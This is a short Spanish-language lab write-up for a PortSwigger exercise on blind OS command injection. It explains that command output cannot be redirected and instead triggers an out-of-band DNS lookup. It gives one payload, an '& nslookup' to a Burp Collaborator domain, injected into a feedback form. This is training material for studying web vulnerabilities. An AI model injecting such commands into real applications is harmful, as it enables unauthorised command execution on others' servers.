---
title: "04 Blind OS command injection with out-of-band interaction"
collection: publications
category: portswigger
permalink: publications/Command Injection/04_Blind OS command injection with out-of-band interaction
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección de comandos de SO ciego en la función de retroalimentación.

La aplicación ejecuta un comando shell que contiene los detalles proporcionados por el usuario. El comando se ejecuta de forma asíncrona y no tiene ningún efecto sobre la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que se pueda acceder. Sin embargo, puede desencadenar interacciones fuera de banda con un dominio externo.'
date: 2024-12-08
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind OS command injection with out-of-band interaction'
---

![logo]({{site.url}}/images/Command Injection/command-lab-4/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Command Injection/command-lab-4/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, explotamos la vulnerabilidad de inyección de comando de SO ciego para emitir una búsqueda DNS a Burp Collaborator.

## Analisis

En esta ocación este laboratorio no podemos redireccionar la salida del comando a otra carpeta, sino a un servidor externo. En esta ocación BurpSuite nos proporciona un "Servidor" el cual se va a redireccionar la salida del comando ejecutado.

Copiamos el servidor `nslookup` que nos proprciona

![Conf1]({{site.url}}/images/Command Injection/command-lab-4/conf1.png)

Asi que debemos inyectar el payload en la respuesta del formulario, no olvidar colocar `url enconde`

```javascript
& nslookup d0eu666xniy2ves1025dljtrzi59t1hq.oastify.com #
```

![Conf2]({{site.url}}/images/Command Injection/command-lab-4/conf2.png)

